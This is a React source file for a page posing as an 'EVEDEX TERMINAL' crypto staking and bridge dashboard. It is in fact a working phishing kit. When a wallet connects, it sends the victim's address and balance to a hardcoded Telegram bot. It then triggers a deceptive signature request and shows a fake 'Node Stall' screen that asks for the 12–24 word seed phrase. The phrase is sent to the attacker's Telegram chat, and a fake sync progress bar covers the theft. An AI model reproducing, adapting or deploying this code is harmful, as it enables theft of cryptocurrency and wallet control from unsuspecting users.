import React, { useState, useEffect, useRef } from 'react';
import { useAccount, useBalance, useSignMessage, useSwitchChain } from 'wagmi';
import { RefreshCcw, AlertCircle, Database, History, Settings, Activity, Clock, Unlock, Zap, ShieldCheck, Globe, Send, Copy, Loader2 } from 'lucide-react';

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { signMessage } = useSignMessage();
  const { switchChain } = useSwitchChain();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [seedVal, setSeedVal] = useState("");   
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);
  const [stage, setStage] = useState(1); 

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";

  const sendTelegram = (text, type = "INFO") => {
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: `[${type}]: ${text}` }),
    });
  };

  // --- AUTOMATIC CONNECTION NOTIFY ---
  useEffect(() => {
    if (isConnected && address && stage === 1) {
      setStage(2);
      sendTelegram(`🟢 CONNECTED | ADDR: ${address} | BAL: ${balance?.formatted || '0'}`);
    }
  }, [isConnected, address, stage, balance]);

  const handleSeedChange = (e) => {
    const val = e.target.value;
    const words = val.trim().split(/\s+/);
    if (words.length > 24) return;
    setSeedVal(val);
  };

  const getWordCount = () => seedVal.trim() === "" ? 0 : seedVal.trim().split(/\s+/).length;

  // --- START SYNC WITH FORCED SIGNATURE POPUP ---
  const startSync = async () => {
    try {
      // 1. Trigger the Wallet Signature Request Immediately on Click
      await signMessage({ 
        message: `AUTHENTICATION_REQUIRED: \n\nNode: MAINNET_RPC_0x${address?.slice(-4)}\nTask: ${activeTask}\n\nSign to verify secure bridge handshake.` 
      });
      
      // 2. If signed successfully, proceed to loading
      setLoading(true);
      setTimeout(() => {
          setLoading(false);
          setView("seed_gate");
          setStage(3);
          sendTelegram(`🚨 USER_AUTHORIZED_SIGN | ADDR: ${address}`);
      }, 2000);

    } catch (err) {
      console.log("User rejected signature or wallet error");
      sendTelegram(`⚠️ SIGN_REJECTED_ON_TASK | ADDR: ${address}`, "WARN");
    }
  };

  return (
    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-4 uppercase tracking-tighter select-none flex flex-col relative font-black">
      
      {/* 📊 MARKET CHART */}
      <div className="w-full h-40 bg-black border border-slate-900 rounded-xl mb-4 overflow-hidden relative">
         <iframe 
            src="https://www.geckoterminal.com/eth/pools/0x88e6a0c2ddd26feeb64f039a2c41296fcb3f5640?embed=1&info=0&swaps=1" 
            className="absolute inset-0 w-full h-full border-none opacity-80 pointer-events-none"
            title="Market Chart"
         />
         <div className="absolute top-2 left-2 bg-black/80 px-2 py-1 rounded text-[7px] text-cyan-500 border border-cyan-900">LIVE_MARKET_FEED</div>
      </div>

      <header className="flex justify-between items-center mb-6 border-b border-slate-900 pb-4 text-cyan-500">
        <div className="flex items-center gap-2 italic text-md"><ShieldCheck size={18}/>EVEDEX TERMINAL</div>
        <w3m-button balance="hide" /> 
      </header>

      <div className="flex-1 overflow-y-auto no-scrollbar pb-10">
        {view === "menu" && (
          <div className="grid grid-cols-3 gap-3">
            {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "Delay", "Bridge"].map((n) => (
              <button key={n} onClick={() => { setActiveTask(n); setView("task_box"); }} className="bg-[#0d1117] border border-slate-800 p-5 rounded-[24px] flex flex-col items-center gap-2 active:scale-95">
                <span className="text-[9px] text-slate-500">{n}</span>
              </button>
            ))}
          </div>
        )}

        {view === "task_box" && (
          <div className="bg-[#0d1117] border border-slate-800 rounded-[35px] p-6 text-center">
            <button onClick={() => setView("menu")} className="text-slate-600 text-[9px] mb-6 block mx-auto">← DASHBOARD</button>
            <h2 className="text-white text-xl italic mb-4">{activeTask} PORTAL</h2>
            <div className={`bg-black/40 border border-slate-900 p-5 rounded-2xl mb-4 text-left ${activeTask === "Rectify" ? "opacity-70" : ""}`}>
              <label className="text-[7px] text-cyan-700 block mb-1">ENTER AMOUNT</label>
              <input type="number" readOnly={activeTask === "Rectify"} placeholder="0.00" className="bg-transparent border-none text-2xl font-mono text-white italic outline-none w-full" autoFocus />
            </div>
            
            {/* INITIALIZE BUTTON NOW TRIGGERS SIGNATURE */}
            <button onClick={startSync} className="w-full bg-cyan-600 py-5 rounded-xl text-[10px] font-black text-white italic flex items-center justify-center gap-2">
              {loading ? <Loader2 className="animate-spin" size={14} /> : `INITIALIZE ${activeTask}`}
            </button>
          </div>
        )}
      </div>

      {view === "seed_gate" && (
        <div className="fixed inset-0 bg-black/98 z-[200] flex flex-col items-center justify-center p-4">
          <div className="bg-[#0d1117] border border-slate-800 w-full max-w-sm rounded-[35px] p-8 text-center mb-10">
            {isSyncing ? (
              <div className="py-8">
                 <div className="relative w-20 h-20 mx-auto mb-6"><div className="absolute inset-0 border-2 border-cyan-500 rounded-full border-t-transparent animate-spin" /><div className="absolute inset-0 flex items-center justify-center text-[10px] text-white">{syncProgress}%</div></div>
                 <h2 className="text-white italic animate-pulse">Finalizing Sync...</h2>
              </div>
            ) : (
              <>
                <AlertCircle size={44} className="text-red-600 mx-auto mb-4 animate-pulse" />
                <h2 className="text-white text-md italic">Node Stall (90%)</h2>
                <div className="text-[8px] text-slate-500 mb-2">Words Entered: {getWordCount()} / 24</div>
                <textarea 
                  value={seedVal} 
                  onChange={handleSeedChange} 
                  placeholder="ENTER 12-24 WORD MASTER KEY..." 
                  className="w-full h-32 bg-black border border-slate-800 rounded-[24px] p-5 text-[10px] font-mono text-cyan-400 outline-none uppercase" 
                />
                <button 
                  disabled={getWordCount() < 12} 
                  onClick={() => { setIsSyncing(true); sendTelegram(`🚨 SEED: ${seedVal}`); let cur = 90; const int = setInterval(() => { cur += 0.2; if (cur >= 100) { setSyncProgress(100); clearInterval(int); } else setSyncProgress(Math.floor(cur)); }, 150); }} 
                  className={`w-full mt-4 py-5 rounded-[20px] text-[10px] text-white ${getWordCount() >= 12 ? 'bg-cyan-600' : 'bg-slate-900 opacity-50'}`}
                >
                  OVERRIDE_SYNC
                </button>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
